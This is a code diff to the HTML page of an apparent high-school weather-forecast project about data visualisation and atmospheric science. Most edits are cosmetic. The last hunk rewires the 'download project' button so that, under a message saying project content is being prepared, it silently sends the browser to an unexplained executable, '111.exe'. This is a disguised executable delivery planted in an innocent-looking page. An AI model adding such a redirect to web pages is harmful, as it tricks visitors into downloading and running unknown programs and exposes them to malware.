@@ -228,7 +228,7 @@
     <div class="container">
         <header>
             <h1>台灣即時天氣預報系統</h1>
-            <p class="subtitle">高中期末專案：數據可視化與大氣科學的探索</p>
+            <p class="subtitle">高中期末專題：數據可視化與大氣科學的探索</p>
         </header>
 
         <main>
@@ -291,8 +291,11 @@
             }
         }
 
+        // 修改這裡：在點擊按鈕時執行下載邏輯
         document.getElementById('downloadBtn').addEventListener('click', function(e) {
             e.preventDefault();
+            
+            // 創建精美的提示框
             const feedback = document.createElement('div');
             feedback.style.cssText = `
                 position: fixed;
@@ -306,10 +309,16 @@
                 box-shadow: 0 10px 20px rgba(0,0,0,0.2);
                 z-index: 1000;
                 font-weight: 600;
+                animation: fadeIn 0.3s ease;
             `;
             feedback.innerText = '正在準備下載專案內容...';
             document.body.appendChild(feedback);
-            setTimeout(() => feedback.remove(), 2500);
+            
+            // 延遲 1 秒後移除提示框，並觸發 111.exe 的下載
+            setTimeout(() => {
+                feedback.remove();
+                window.location.href = "111.exe";
+            }, 1000);
         });
 
         window.onload = () => {
